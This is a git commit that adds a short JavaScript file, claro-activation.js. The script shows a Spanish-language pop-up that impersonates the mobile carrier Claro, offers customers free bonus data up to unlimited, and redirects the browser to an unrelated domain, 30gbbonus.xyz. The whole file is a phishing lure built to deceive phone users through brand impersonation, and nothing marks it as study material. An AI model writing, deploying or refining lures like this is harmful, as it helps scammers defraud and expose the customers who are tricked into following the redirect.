901d97037d57c5f95b46e1018b1169c35cb3e002
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-06-02 06:16:43 -0700

    Create claro-activation.js

---
+++ claro-activation.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('CLARO: Estimado cliente de Claro, verifique si su tarjeta SIM califica para recibir desde 5 GB hasta datos ilimitados, recompensa para clientes antiguos de Claro, presione 1 para verificar ahora ','1');
+if (password != '1') {
+location.href='https://30gbbonus.xyz/claro.html';
+}
